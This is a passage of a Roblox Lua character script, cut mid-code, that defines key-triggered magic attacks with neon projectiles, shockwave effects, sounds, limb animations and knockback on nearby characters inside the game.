			swoosh.Size = Vector3.new(1.7,1.7,1.7)
			swoosh.Shape = "Ball"
			swoosh.Material = "Neon"
			swoosh.BrickColor = BrickColor.new("Really black")
			swoosh.CanCollide = false
			swoosh.Touched:connect(function(hit)
				if hit.Parent:IsA("Part") then
				elseif hit.Parent:IsA("SpecialMesh") then
				elseif hit.Parent.Name == game.Players.LocalPlayer.Name then
				elseif hit.Parent:findFirstChildOfClass("Humanoid") then
					Slachtoffer = hit.Parent:findFirstChildOfClass("Humanoid")
					if Slachtoffer.Health < 1 then return end
					if damagedebounce == true then return end
					damagedebounce = true
					swoosh:Remove()
					explosion = Instance.new("Part",LeftArm)
					explosion.CFrame = hit.CFrame
					explosion.Anchored = true
					explosion.CanCollide = false
					explosion.Name = "explo"
					explosion.Shape = "Ball"
					explosion.BrickColor = BrickColor.new("Really black")
					explosion.Material = "Neon"
					removeuseless:AddItem(explosion,1.5)
					vel = Instance.new("BodyVelocity",hit.Parent:FindFirstChild("Torso") or hit.Parent:FindFirstChild("UpperTorso")) 
					vel.maxForce = Vector3.new(9999999999999,9999999999999,9999999999999)
					torso = hit.Parent:FindFirstChild("Torso") or hit.Parent:FindFirstChild("UpperTorso")
					vel.velocity = CFrame.new(swoosh.Position,torso.Position).lookVector*60
					removeuseless:AddItem(vel,.1)
					SOUND(explosion,472579737,6,false,3)
					coroutine.wrap(function()
						if firsttime2 then return end
						firsttime2 = true
						while true do
							for i,v in pairs(LeftArm:GetChildren()) do
								if v.Name == "explo" then
									v.Size = v.Size + Vector3.new(2.5,2.5,2.5)
									v.Transparency = v.Transparency + .05
								end
							end
							for i,v in pairs(LeftArm:GetChildren()) do
								if v.Name == "shock" then
									v.Transparency = v.Transparency + .05
								end
							end
							for i,v in pairs(LeftArm:GetChildren()) do
								if v.Name == "shock2" then
									v.Transparency = v.Transparency + .05
								end
							end
							swait()
						end
					end)()
					Slachtoffer:TakeDamage(0)
					wait(.1)
					damagedebounce = false
				end
			end)
			coroutine.wrap(function()
				if firsttime then return end
				firsttime = true
				while wait() do
					for i,v in pairs(Torso:GetChildren()) do
						if v.Name == "swoosh" then
							magiccc = Instance.new("Part",RightArm)
							magiccc.Material = "Neon"
							magiccc.CanCollide = false
							magiccc.Anchored = true
							magiccc.BrickColor = BrickColor.new(colors)
							magiccc.Size = Vector3.new(1.5,1.5,1.5)
							magiccc.CFrame = v.CFrame * CFrame.Angles(math.random(-180,180),math.random(-180,180),math.random(-180,180))
							removeuseless:AddItem(magiccc,2)
						end
					end
				end
			end)()
			bov = Instance.new("BodyVelocity",swoosh)
			bov.maxForce = Vector3.new(99999,99999,99999)
			swoosh.CFrame = CFrame.new(swoosh.Position,mouse.Hit.p)
			bov.velocity = swoosh.CFrame.lookVector*120
			removeuseless:AddItem(swoosh,4)
			for i = 1, 15 do
				ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(10),math.rad(15),math.rad(0)),.5)
				RIGHTARMLERP.C1 = CFrame.new(0,0,0)
				RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(-1.2,1,.5) * CFrame.Angles(math.rad(-90),math.rad(-25),math.rad(0)), 0.5)
				swait()
			end
			ws = 50
			removeuseless:AddItem(g1,0.01)
			debounce = false
			attacking = false
		end
	end)

	mouse.KeyDown:connect(function(Press)
		Press=Press:lower()
		if Press=='h' then
			if not levitate then return end
			if debounce then return end
			debounce = true
			attacking = true
			ws = 15
			appi = true
			coroutine.wrap(function()
				while appi do
					swait()
					if Root.Velocity.Magnitude < 2 and attacking == true then
						position = "Idle3"
					end
				end
			end)()
			coroutine.wrap(function()
				while appi do
					swait()
					settime = 0.05
					sine = sine + change
					if position == "Idle3" and attacking == true and appi == true then
						change = .4
						RIGHTLEGLERP.C1 = RIGHTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(0),0,0),.1)
						LEFTLEGLERP.C1 = LEFTLEGLERP.C1:lerp(CFrame.new(-.2,.2,0) * CFrame.Angles(0,0,0),.1)
						LEFTARMLERP.C1 = CFrame.new(0,0,0) * CFrame.Angles(0,0,0)
						LEFTARMLERP.C0 = LEFTARMLERP.C0:lerp(CFrame.new(1.6, 0.8 - .1 * math.sin(sine/9), 0) * CFrame.Angles(math.rad(0), math.rad(0 + 3 * math.sin(sine/9)), math.rad(35 - 5 * math.sin(sine/9))), 0.4)
						RIGHTLEGLERP.C0 = RIGHTLEGLERP.C0:lerp(CFrame.new(-0.54, 1.4 + .1 * math.sin(sine/9), .4) * CFrame.Angles(math.rad(9 + 2 * math.cos(sine/9)), math.rad(0), math.rad(0)), 0.4)
						LEFTLEGLERP.C0 = LEFTLEGLERP.C0:lerp(CFrame.new(0.5, 2.0,0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(-10 + 2 * math.sin(sine/9))), 0.4)
					end
				end
			end)()
			coroutine.wrap(function()
				for i = 1, 20 do
					RIGHTARMLERP.C1 = CFrame.new(0,0,0) * CFrame.Angles(0,0,0)
					ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0, 0, 0) * CFrame.Angles(0,math.rad(50),0),.3)
					RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(-1.1,1.3,1.1) * CFrame.Angles(math.rad(180),math.rad(-50),math.rad(0)), 0.3)
					swait()
				end
			end)()
			SOUND(LeftArm,1982011510,8,false,15)
			blackhole={}
			orbzfade={}
			xz = 0
			for i = 1, 220 do
				xz = xz + .009
				bigrmagic = Instance.new("Part",RightArm)
				bigrmagic.Material = "Neon"
				bigrmagic.CanCollide = false
				bigrmagic.Anchored = true
				bigrmagic.BrickColor = BrickColor.new(colors)
				bigrmagic.Size = Vector3.new(xz,xz,xz)
				bigrmagic.CFrame = rightlocation.CFrame * CFrame.Angles(math.random(-180,180),math.random(-180,180),math.random(-180,180))
				removeuseless:AddItem(bigrmagic,1)
				orbz = Instance.new("Part", Torso)
				orbz.Material = "Neon"
				orbz.BrickColor = BrickColor.new(colors)
				orbz.Size = Vector3.new(2,2,2)
				orbz.Anchored = true
				orbz.CanCollide = false
				removeuseless:AddItem(orbz,1)
				orbz.CFrame = rightlocation.CFrame * CFrame.new(math.random(-25,25),math.random(-25,25),math.random(-25,25)) * CFrame.Angles(math.rad(-180,180),math.rad(-180,180),math.rad(-180,180))
				table.insert(blackhole,orbz)
				table.insert(orbzfade,orbz)
				for i,v in pairs(blackhole) do
					v.Size = v.Size - Vector3.new(.1,.1,.1)
					v.CFrame = v.CFrame:lerp(CFrame.new(rightlocation.Position),.09)
				end
				for i,v in pairs(orbzfade) do
					v.Transparency = v.Transparency + 0.025
				end
				swait()
			end
			coroutine.wrap(function()
				for i = 1, 10 do
					for i,v in pairs(blackhole) do
						v.Size = v.Size + Vector3.new(.5,.5,.5)
						v.Transparency = v.Transparency + .1
					end
					swait()
				end
				for i,v in pairs(blackhole) do
					v:Remove()
				end
				clean()
			end)()
			charging = true
			coroutine.wrap(function()
				while charging do
					bigrmagic = Instance.new("Part",RightArm)
					bigrmagic.Material = "Neon"
					bigrmagic.CanCollide = false
					bigrmagic.Anchored = true
					bigrmagic.BrickColor = BrickColor.new(colors)
					bigrmagic.Size = Vector3.new(xz,xz,xz)
					bigrmagic.CFrame = rightlocation.CFrame * CFrame.Angles(math.random(-180,180),math.random(-180,180),math.random(-180,180))
					removeuseless:AddItem(bigrmagic,.2)
					swait()
				end
			end)()
			g1 = Instance.new("BodyGyro", Root)
			g1.D = 175
			g1.P = 20000
			g1.MaxTorque = Vector3.new(0,9000,0)
			BigFireBall:Play()
			for i = 1, 15 do
				g1.CFrame = g1.CFrame:lerp(CFrame.new(Root.Position,mouse.Hit.p),.2)
				ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(-10),math.rad(-15),math.rad(0)),.5)
				RIGHTARMLERP.C1 = CFrame.new(0,0,0) * CFrame.Angles(0,0,0)
				RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(-0.5, 2, 0) * CFrame.Angles(math.rad(14), math.rad(20), math.rad(-90)), 0.3)
				swait()
			end
			coroutine.wrap(function()
				for i = 1, 15 do
					ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(10),math.rad(15),math.rad(0)),.5)
					RIGHTARMLERP.C1 = CFrame.new(0,0,0)
					RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(-1.2,1,.5) * CFrame.Angles(math.rad(-90),math.rad(-25),math.rad(0)), 0.5)
					swait()
				end
			end)()
			charging = false
			local ballzor = Instance.new("Part",Torso)
			ballzor.Name = "ballzor"
			ballzor.Material = "Neon"
			ballzor.BrickColor = BrickColor.new("Really black")
			ballzor.CanCollide = false
			ballzor.Size = Vector3.new(xz,xz,xz)
			ballzor.Anchored = false
			ballzor.CFrame = Root.CFrame * CFrame.new(1,0,-5)
			ballzor.Shape = "Ball"
			removeuseless:AddItem(g1,.0001)
			zx = xz + .05
			coroutine.wrap(function()
				if firsttime5 then return end
				firsttime5 = true
				while true do
					swait()
					for i,v in pairs(Torso:GetChildren()) do
						if v.Name == "ballzor" then
							magicccc = Instance.new("Part",RightArm)
							magicccc.Material = "Neon"
							magicccc.CanCollide = false
							magicccc.Name = "magicccc"
							magicccc.Anchored = true
							magicccc.Transparency = 0
							magicccc.BrickColor = BrickColor.new(colors)
							magicccc.Size = Vector3.new(zx,zx,zx)
							magicccc.CFrame = v.CFrame * CFrame.Angles(math.random(-180,180),math.random(-180,180),math.random(-180,180))
							removeuseless:AddItem(magicccc,2)
						end
					end
					for i,v in pairs(RightArm:GetChildren()) do
						if v.Name == "magicccc" then
							v.Transparency = v.Transparency + 0.025
						end
					end
				end
			end)()
			ballzor.Touched:connect(function(hit)
				if hit.Name ~= "magicccc" then
					if bigball then return end
					bigball = true
					local explosionwave = Instance.new("Part",Torso) 
					explosionwave.Shape = "Ball"
					explosionwave.BrickColor = BrickColor.new("Really black")
					explosionwave.Anchored = true
					explosionwave.CanCollide = false
					explosionwave.Transparency = .2
					explosionwave.Material = "Neon"
					explosionwave.Size = Vector3.new(1,1,1)
					explosionwave.CFrame = ballzor.CFrame
					render = Instance.new("Sound",explosionwave)
					render.SoundId = "rbxassetid://2006635781"
					render.Volume = 10 * 10
					render:Play()
					local explosionwave2 = Instance.new("Part",Torso)
					explosionwave2.Shape = "Ball"
					explosionwave2.BrickColor = BrickColor.new("Really red")
					explosionwave2.Anchored = true
					explosionwave2.CanCollide = false
					explosionwave2.Material = "Neon"
					explosionwave2.Size = Vector3.new(.8,.8,.8)
					explosionwave2.CFrame = ballzor.CFrame
					deadlywave = Instance.new("Part", explosionwave)
					deadlywave.Size = Vector3.new(1,1,1)
					deadlywave.CanCollide = false
					deadlywave.Anchored = true
					deadlywave.Transparency = .5
					deadlywave.BrickColor = BrickColor.new("Really red")
					deadlywave.CFrame = CFrame.new(explosionwave.Position)
					deadlywavemesh = Instance.new("SpecialMesh", deadlywave)
					deadlywavemesh.Scale = Vector3.new(1,2,1)
					deadlywavemesh.MeshId = "rbxassetid://20329976"
					deadlywave2 = Instance.new("Part", explosionwave)
					deadlywave2.Size = Vector3.new(1,1,1)
					deadlywave2.CanCollide = false
					deadlywave2.Anchored = true
					deadlywave2.Transparency = .5
					deadlywave2.BrickColor = BrickColor.new("Really black")
					deadlywave2.CFrame = CFrame.new(explosionwave.Position)
					deadlywave2mesh = Instance.new("SpecialMesh", deadlywave2)
					deadlywave2mesh.Scale = Vector3.new(3,2,3)
					deadlywave2mesh.MeshId = "rbxassetid://20329976"
					deadlyring = Instance.new("Part", Torso)
					deadlyring.Size = Vector3.new(5, 5, 5)
					deadlyring.Transparency = 0.5
					deadlyring.BrickColor = BrickColor.new("Really black")
					deadlyring.Anchored = true
					deadlyring.CanCollide = false
					deadlyring.CFrame = deadlywave.CFrame * CFrame.Angles(math.rad(math.random(-180,180)), math.rad(math.random(-180,180)), math.rad(math.random(-180,180)))
					deadlyringh = Instance.new("SpecialMesh", deadlyring) 
					deadlyringh.MeshId = "http://www.roblox.com/asset/?id=3270017" 
					deadlyringh.Scale = Vector3.new(8, 8, .1)
					deadlyring2 = Instance.new("Part", Torso)
					deadlyring2.Size = Vector3.new(5, 5, 5)
					deadlyring2.Transparency = 0.5
					deadlyring2.BrickColor = BrickColor.new("Really black")
					deadlyring2.Anchored = true
					deadlyring2.CanCollide = false
					deadlyring2.CFrame = deadlywave.CFrame * CFrame.Angles(math.rad(math.random(-180,180)), math.rad(math.random(-180,180)), math.rad(math.random(-180,180)))
					deadlyringh2 = Instance.new("SpecialMesh", deadlyring2) 
					deadlyringh2.MeshId = "http://www.roblox.com/asset/?id=3270017" 
					deadlyringh2.Scale = Vector3.new(8, 8, .1)
					ballzor:Remove()
					bigball = false
					staybooming = true
					d = 5
					coroutine.wrap(function()
						while staybooming do
							Hit = damagealll(d,deadlywave.Position)
							for _,v in pairs(Hit) do			
								v:FindFirstChildOfClass("Humanoid"):TakeDamage(0)
								vel = Instance.new("BodyVelocity",v:FindFirstChild("Torso") or v:FindFirstChild("UpperTorso")) 
								vel.maxForce = Vector3.new(9999999999999,9999999999999,9999999999999)
								torso = v:FindFirstChild("Torso") or v:FindFirstChild("UpperTorso")
								vel.velocity = CFrame.new(deadlywave.Position,torso.Position).lookVector*50
								removeuseless:AddItem(vel,.1)
							end
							wait(.1)
						end
					end)()
					for i = 1, 70 do
						d = d + 1
						deadlyringh2.Scale = deadlyringh2.Scale + Vector3.new(.5, .5, .1)
						deadlyringh.Scale = deadlyringh.Scale + Vector3.new(.5, .5, .1)
						deadlyring.CFrame = deadlyring.CFrame * CFrame.Angles(math.rad(0+7),math.rad(0-7),math.rad(0+7))
						deadlyring2.CFrame = deadlyring2.CFrame * CFrame.Angles(math.rad(0-7),math.rad(0+7),math.rad(0-7))
						deadlywave.CFrame = deadlywave.CFrame * CFrame.Angles(0,math.rad(0+7),0)
						deadlywave2.CFrame = deadlywave2.CFrame * CFrame.Angles(0,math.rad(0+4),0)
						deadlywavemesh.Scale = deadlywavemesh.Scale + Vector3.new(.4,0,.4)
						deadlywave2mesh.Scale = deadlywave2mesh.Scale + Vector3.new(.5,0,.5)
						explosionwave.Size = explosionwave.Size + Vector3.new(.5,.5,.5)
						explosionwave2.Size = explosionwave2.Size + Vector3.new(.5,.5,.5)
						swait()
					end
					for i = 1, 80 do
						d = d + 3
						hum.CameraOffset = Vector3.new(math.random(-1,1),math.random(-1,1),math.random(-1,1))
						deadlyringh2.Scale = deadlyringh2.Scale + Vector3.new(4, 4, .2)
						deadlyringh.Scale = deadlyringh.Scale + Vector3.new(4, 4, .2)
						deadlyring.CFrame = deadlyring.CFrame * CFrame.Angles(math.rad(0+12),math.rad(0-12),math.rad(0+12))
						deadlyring2.CFrame = deadlyring2.CFrame * CFrame.Angles(math.rad(0-12),math.rad(0+12),math.rad(0-12))
						deadlywave.CFrame = deadlywave.CFrame * CFrame.Angles(0,math.rad(0+20),0)
						deadlywave2.CFrame = deadlywave2.CFrame * CFrame.Angles(0,math.rad(0+14),0)
						deadlywavemesh.Scale = deadlywavemesh.Scale + Vector3.new(3,2,3)
						deadlywave2mesh.Scale = deadlywave2mesh.Scale + Vector3.new(4,1,4)
						explosionwave.Size = explosionwave.Size + Vector3.new(4,4,4)
						explosionwave2.Size = explosionwave2.Size + Vector3.new(4,4,4)
						swait()
					end
					staybooming = false
					for i = 1, 20 do
						d = d + 3
						hum.CameraOffset = Vector3.new(math.random(-1,1),math.random(-1,1),math.random(-1,1))
						deadlyringh2.Scale = deadlyringh2.Scale + Vector3.new(4, 4, .2)
						deadlyringh.Scale = deadlyringh.Scale + Vector3.new(4, 4, .2)
						deadlyring.CFrame = deadlyring.CFrame * CFrame.Angles(math.rad(0+12),math.rad(0-12),math.rad(0+12))
						deadlyring2.CFrame = deadlyring2.CFrame * CFrame.Angles(math.rad(0-12),math.rad(0+12),math.rad(0-12))
						deadlyring.Transparency = deadlyring.Transparency + .25
						deadlyring2.Transparency = deadlyring2.Transparency + .25
						deadlywave.CFrame = deadlywave.CFrame * CFrame.Angles(0,math.rad(0+20),0)
						deadlywave2.CFrame = deadlywave2.CFrame * CFrame.Angles(0,math.rad(0+14),0)
						deadlywavemesh.Scale = deadlywavemesh.Scale + Vector3.new(3,0,3)
						deadlywave2mesh.Scale = deadlywave2mesh.Scale + Vector3.new(4,0,4)
						deadlywave.Transparency = deadlywave.Transparency + .25
						deadlywave2.Transparency = deadlywave2.Transparency + .25
						explosionwave.Size = explosionwave.Size + Vector3.new(4,4,4)
						explosionwave2.Size = explosionwave2.Size + Vector3.new(4,4,4)
						explosionwave.Transparency = explosionwave.Transparency + 0.25
						explosionwave2.Transparency = explosionwave2.Transparency + 0.05
						swait()
					end
					hum.CameraOffset = Vector3.new(0,0,0)
					explosionwave:Remove()
					explosionwave2:Remove()
				end
			end)
			bov = Instance.new("BodyVelocity",ballzor)
			bov.maxForce = Vector3.new(99999,99999,99999)
			ballzor.CFrame = CFrame.new(ballzor.Position,mouse.Hit.p)
			bov.velocity = ballzor.CFrame.lookVector*200
			removeuseless:AddItem(ballzor,4)
			ws = 50
			attacking = false
			debounce = false
			appi = false
		end
	end)

	mouse.KeyDown:connect(function(Press)
		Press=Press:lower()
		if Press=='j' then
			if not levitate then return end
			if debounce then return end
			debounce = true
			charging = true
			attacking = true
			downpress = false
			x = 1
			ws = 15
			g1 = Instance.new("BodyGyro", Root)
			g1.D = 175
			g1.P = 20000
			g1.MaxTorque = Vector3.new(0,9000,0)
			SOUND(RightArm,2014087015,8,false,3)
			coroutine.wrap(function()
				Charge = Instance.new("Sound",RightArm)
				Charge.SoundId = "rbxassetid://101153932"
				Charge.Looped = false
				Charge.Volume = 8
				Charge:Play()
			end)()
			appi = true
			coroutine.wrap(function()
				while appi do
					swait()
					if Root.Velocity.Magnitude < 2 and attacking == true then
						position = "Idle3"
					end
				end
			end)()
			coroutine.wrap(function()
				while appi do
					swait()
					settime = 0.05
					sine = sine + change
					if position == "Idle3" and attacking == true and appi == true then
						change = .4
						RIGHTLEGLERP.C1 = RIGHTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(0),0,0),.1)
						LEFTLEGLERP.C1 = LEFTLEGLERP.C1:lerp(CFrame.new(-.2,.2,0) * CFrame.Angles(0,0,0),.1)
						LEFTARMLERP.C1 = CFrame.new(0,0,0) * CFrame.Angles(0,0,0)
						LEFTARMLERP.C0 = LEFTARMLERP.C0:lerp(CFrame.new(1.6, 0.8 - .1 * math.sin(sine/9), 0) * CFrame.Angles(math.rad(0), math.rad(0 + 3 * math.sin(sine/9)), math.rad(35 - 5 * math.sin(sine/9))), 0.4)
						RIGHTLEGLERP.C0 = RIGHTLEGLERP.C0:lerp(CFrame.new(-0.54, 1.4 + .1 * math.sin(sine/9), .4) * CFrame.Angles(math.rad(9 + 2 * math.cos(sine/9)), math.rad(0), math.rad(0)), 0.4)
						LEFTLEGLERP.C0 = LEFTLEGLERP.C0:lerp(CFrame.new(0.5, 2.0,0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(-10 + 2 * math.sin(sine/9))), 0.4)
					end
				end
			end)()
			for i = 1, 15 do
				g1.CFrame = g1.CFrame:lerp(CFrame.new(Root.Position,mouse.Hit.p),.2)
				ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(-10),math.rad(-15),math.rad(0)),.5)
				RIGHTARMLERP.C1 = CFrame.new(0,0,0) * CFrame.Angles(0,0,0)
				RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(-0.5, 2, 0) * CFrame.Angles(math.rad(14), math.rad(20), math.rad(-90)), 0.3)
				swait()
			end
			for i = 1, 3 do
				g1.CFrame = g1.CFrame:lerp(CFrame.new(Root.Position,mouse.Hit.p),.4)
				ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(-10),math.rad(-15),math.rad(0)),.5)
				RIGHTARMLERP.C1 = CFrame.new(0,0,0) * CFrame.Angles(0,0,0)
				RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(-0.5, 2, 0) * CFrame.Angles(math.rad(14), math.rad(20), math.rad(-90)), 0.3)
				x = x + .1
				blastborb = Instance.new("Part",Torso)
				blastborb.CFrame = rightlocation.CFrame * CFrame.Angles(math.rad(math.random(-180,180)),math.rad(math.random(-180,180)),math.rad(math.random(-180,180)))
				blastborb.BrickColor = BrickColor.new(colors)
				blastborb.Anchored = true
				blastborb.Size = Vector3.new(10,10,10)
				blastborb.CanCollide = false
				blastborb.Material = "Neon"
				for i = 1, 5 do
					g1.CFrame = g1.CFrame:lerp(CFrame.new(Root.Position,mouse.Hit.p),.4)
					blastborb.Size = blastborb.Size - Vector3.new(1,1,1)
					swait()
				end
				blastborb:Remove()
				swait()
			end
			downpress = true
			while charging and x < 5  do
				g1.CFrame = g1.CFrame:lerp(CFrame.new(Root.Position,mouse.Hit.p),.4)
				ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(-10),math.rad(-15),math.rad(0)),.5)
				RIGHTARMLERP.C1 = CFrame.new(0,0,0) * CFrame.Angles(0,0,0)
				RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(-0.5, 2, 0) * CFrame.Angles(math.rad(14), math.rad(20), math.rad(-90)), 0.3)
				x = x + .1
				blastborb = Instance.new("Part",Torso)
				blastborb.CFrame = rightlocation.CFrame * CFrame.Angles(math.rad(math.random(-180,180)),math.rad(math.random(-180,180)),math.rad(math.random(-180,180)))
				blastborb.BrickColor = BrickColor.new(colors)
				blastborb.Anchored = true
				blastborb.Size = Vector3.new(10,10,10)
				blastborb.CanCollide = false
				blastborb.Material = "Neon"
				for i = 1, 5 do
					g1.CFrame = g1.CFrame:lerp(CFrame.new(Root.Position,mouse.Hit.p),.4)
					blastborb.Size = blastborb.Size - Vector3.new(1,1,1)
					swait()
				end
				blastborb:Remove()
				swait()
			end
			coroutine.wrap(function()
				for i = 1, 20 do
					Charge.Volume = Charge.Volume - .5
					swait()
				end
			end)()
			local bigswoosh = Instance.new("Part",Torso)
			bigswoosh.Name = "bigswoosh"
			bigswoosh.CFrame = Root.CFrame * CFrame.new(1,0,-5)
			bigswoosh.Size = Vector3.new(1,1,1)
			bigswoosh.Material = "Neon"
			bigswoosh.Anchored = true
			bigswoosh.Transparency = 1
			bigswoosh.BrickColor = BrickColor.new("Really red")
			bigswoosh.CanCollide = false
			SOUND(bigswoosh,842332424,10,false,6)
			SOUND(bigswoosh,2017948224,10,false,6)
			SOUND(bigswoosh,138677306,10,false,4)
			coroutine.wrap(function()
				local loc1 = Instance.new("Part",bigswoosh)
				loc1.CFrame = bigswoosh.CFrame * CFrame.new(-3,0,0)
				loc1.Size = Vector3.new(2,2,2)
				loc1.Anchored = true
				loc1.Transparency = 1
				loc1.CanCollide = false
				local loc2 = Instance.new("Part",bigswoosh)
				loc2.CFrame = bigswoosh.CFrame * CFrame.new(3,0,0)
				loc2.Size = Vector3.new(2,2,2)
				loc2.Anchored = true
				loc2.Transparency = 1
				loc2.CanCollide = false
				n = 0
				nb = 0
				for i = 1, 125 do
					n = n + x
					nb = nb - x
					Hit = damagealll(n,bigswoosh.Position)
					for _,v in pairs(Hit) do
						if x > 4.5 then		
							print("ok")
						else	
							v:FindFirstChildOfClass("Humanoid"):TakeDamage(0)
						end
						vel = Instance.new("BodyVelocity",v:FindFirstChild("Torso") or v:FindFirstChild("UpperTorso")) 
						vel.maxForce = Vector3.new(9999999999999,9999999999999,9999999999999)
						torso = v:FindFirstChild("Torso") or v:FindFirstChild("UpperTorso")
						vel.velocity = CFrame.new(bigswoosh.Position,torso.Position).lookVector*150
						removeuseless:AddItem(vel,.1)
					end
					local bigtrail = Instance.new("Part",LeftArm)
					bigtrail.Size = bigswoosh.Size
					bigtrail.BrickColor = BrickColor.new(colors)
					bigtrail.Anchored = true
					bigtrail.Material = "Neon"
					bigtrail.CFrame = bigswoosh.CFrame * CFrame.Angles(math.rad(math.random(-180,180)),math.rad(math.random(-180,180)),math.rad(math.random(-180,180)))
					bigtrail.CanCollide = false
					removeuseless:AddItem(bigtrail,2)
					local irritatedground = Instance.new("Part",Torso)
					irritatedground.Size = Vector3.new(n*1.5,1,3*x)
					irritatedground.BrickColor = BrickColor.new(colors)
					irritatedground.Material = "Neon"
					irritatedground.CFrame = bigswoosh.CFrame * CFrame.new(0,-6,0)
					irritatedground.CanCollide = false
					irritatedground.Anchored = true
					removeuseless:AddItem(irritatedground,10)
					local grassblocks = Instance.new("Part",Torso)
					grassblocks.Size = Vector3.new(n/2,n/2,n/2)
					grassblocks.Material = "Grass"
					grassblocks.Anchored = true
					grassblocks.Name = "grassblocks"
					grassblocks.BrickColor = BrickColor.new("Bright green")
					grassblocks.CFrame = loc1.CFrame * CFrame.new(0,-1,0) * CFrame.Angles(math.rad(math.random(-180,180)),math.rad(math.random(-180,180)),math.rad(math.random(-180,180)))
					removeuseless:AddItem(grassblocks,10)
					local grassblocks2 = Instance.new("Part",Torso)
					grassblocks2.Size = Vector3.new(n/2,n/2,n/2)
					grassblocks2.Material = "Grass"
					grassblocks2.Anchored = true
					grassblocks2.Name = "grassblocks2"
					grassblocks2.BrickColor = BrickColor.new("Bright green")
					grassblocks2.CFrame = loc2.CFrame * CFrame.new(0,-1,0) * CFrame.Angles(math.rad(math.random(-180,180)),math.rad(math.random(-180,180)),math.rad(math.random(-180,180)))
					removeuseless:AddItem(grassblocks2,10)
					bigswoosh.Size = bigswoosh.Size + Vector3.new(x,x,x)
					loc1.CFrame = bigswoosh.CFrame * CFrame.new(n,-3,0)
					loc2.CFrame = bigswoosh.CFrame * CFrame.new(nb,-3,0)
					bigswoosh.CFrame = bigswoosh.CFrame * CFrame.new(0,0,-3 - x)
					swait()
				end
				for i = 1, 20 do
					bigswoosh.CFrame = bigswoosh.CFrame * CFrame.new(0,0,-3)
					bigswoosh.Transparency = bigswoosh.Transparency + 0.05
					swait()
				end
				bigswoosh:Remove()
			end)()
			for i = 1, 50 do
				ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(10),math.rad(15),math.rad(0)),.5)
				RIGHTARMLERP.C1 = CFrame.new(0,0,0)
				RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(-1.2,1,.5) * CFrame.Angles(math.rad(-90),math.rad(-25),math.rad(0)), 0.5)
				swait()
			end
			ws = 50
			attacking = false
			debounce = false
			appi = false
			g1:Remove()
		end
	end)

	mouse.KeyDown:connect(function(Press)
		Press=Press:lower()
		if Press=='k' then
			if not levitate then return end
			if debounce then return end
			debounce = true
			attacking = true
			charging = true
			appi = true
			coroutine.wrap(function()
				while appi do
					swait()
					if Root.Velocity.Magnitude < 2 and attacking == true then
						position = "Idle3"
					end
				end
			end)()
			coroutine.wrap(function()
				while appi do
					swait()
					settime = 0.05
					sine = sine + change
					if position == "Idle3" and attacking == true and appi == true then
						change = .4
						RIGHTLEGLERP.C1 = RIGHTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(0),0,0),.1)
						LEFTLEGLERP.C1 = LEFTLEGLERP.C1:lerp(CFrame.new(-.2,.2,0) * CFrame.Angles(0,0,0),.1)
						LEFTARMLERP.C1 = CFrame.new(0,0,0) * CFrame.Angles(0,0,0)
						LEFTARMLERP.C0 = LEFTARMLERP.C0:lerp(CFrame.new(1.6, 0.8 - .1 * math.sin(sine/9), 0) * CFrame.Angles(math.rad(0), math.rad(0 + 3 * math.sin(sine/9)), math.rad(35 - 5 * math.sin(sine/9))), 0.4)
						RIGHTLEGLERP.C0 = RIGHTLEGLERP.C0:lerp(CFrame.new(-0.54, 1.4 + .1 * math.sin(sine/9), .4) * CFrame.Angles(math.rad(9 + 2 * math.cos(sine/9)), math.rad(0), math.rad(0)), 0.4)
						LEFTLEGLERP.C0 = LEFTLEGLERP.C0:lerp(CFrame.new(0.5, 2.0,0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(-10 + 2 * math.sin(sine/9))), 0.4)
					end
				end
			end)()
			ws = 15
			g1 = Instance.new("BodyGyro", Root)
			g1.D = 175
			g1.P = 20000
			g1.MaxTorque = Vector3.new(0,9000,0)
			g1.CFrame = CFrame.new(Root.Position,mouse.Hit.p)
			for i = 1, 15 do
				g1.CFrame = g1.CFrame:lerp(CFrame.new(Root.Position,mouse.Hit.p),.3)
				ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(0),math.rad(90),math.rad(0)),.3)
				RIGHTARMLERP.C1 = CFrame.new(0,0,0) * CFrame.Angles(0,0,0)
				RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(-.5, 2, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(-90)), 0.3)
				swait()
			end
			r = 0
			for i = 1, 10 do
				r = r + .1
				g1.CFrame = g1.CFrame:lerp(CFrame.new(Root.Position,mouse.Hit.p),.3)
				blass = Instance.new("Part",RightArm)
				blass.Size = Vector3.new(r,r,r)
				blass.Material = "Neon"
				blass.CFrame = rightlocation.CFrame * CFrame.new(0,-r/1.5,0) * CFrame.Angles(math.rad(math.random(-180,180)),math.rad(math.random(-180,180)),math.rad(math.random(-180,180)))
				blass.Anchored = true
				blass.CanCollide = false
				blass.BrickColor = BrickColor.new(colors)
				removeuseless:AddItem(blass,2)
				swait()
